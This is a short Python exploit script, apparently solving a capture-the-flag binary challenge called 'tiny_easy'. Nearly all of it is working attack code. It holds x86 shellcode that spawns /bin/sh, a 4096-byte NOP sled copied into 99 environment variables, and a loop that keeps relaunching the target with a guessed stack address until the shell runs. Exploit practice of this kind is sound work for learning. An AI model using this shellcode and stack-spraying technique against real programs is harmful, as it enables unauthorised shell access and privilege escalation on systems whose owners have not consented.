import subprocess

myenv = {}
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"\
            "\x73\x68\x68\x2f\x62\x69\x6e\x89"\
            "\xe3\xb0\x0b\xcd\x80"
nopsled = 4096 * '\x90'

for i in range(1,100):
    myenv['pwn'+str(i)] = nopsled + shellcode

while True:
    p = subprocess.Popen(['\xdc\x0e\xcb\xff'],executable='tiny_easy',env=myenv)
    p.wait()